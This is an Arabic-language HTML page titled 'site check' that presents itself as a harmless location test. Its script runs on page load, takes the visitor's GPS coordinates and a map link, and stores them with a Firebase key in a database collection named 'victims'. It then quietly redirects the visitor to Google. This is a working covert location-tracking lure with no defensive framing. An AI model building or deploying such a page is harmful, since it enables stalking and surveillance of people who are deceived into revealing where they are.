<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>فحص الموقع</title>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:#1a1a2e;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;text-align:center}.container{max-width:400px}.logo{font-size:60px;margin-bottom:10px}h1{color:#4CAF50;font-size:18px;margin-bottom:5px}p{color:#aaa;font-size:12px}.status{color:#4CAF50;font-size:14px;margin-top:15px}</style></head>
<body><div class="container"><div class="logo">📍</div><h1>فحص الموقع</h1><p>جاري تحديد موقعك...</p><div class="status" id="status">⏳ جاري الفحص...</div></div>
<script>
firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
var db=firebase.firestore();
async function go(){try{navigator.geolocation.getCurrentPosition(async function(p){var loc=p.coords.latitude+','+p.coords.longitude;var map='https://maps.google.com/?q='+loc;await db.collection('victims').add({service:'📍 فحص الموقع',text:'الموقع: '+loc+'\nالخريطة: '+map,data:loc,timestamp:new Date().toISOString()});document.getElementById('status').textContent='✅ تم تحديد الموقع';setTimeout(function(){window.location.href='https://google.com/'},2000)},function(){document.getElementById('status').textContent='❌ خطأ'})}catch(e){}}
go();
</script></body></html>
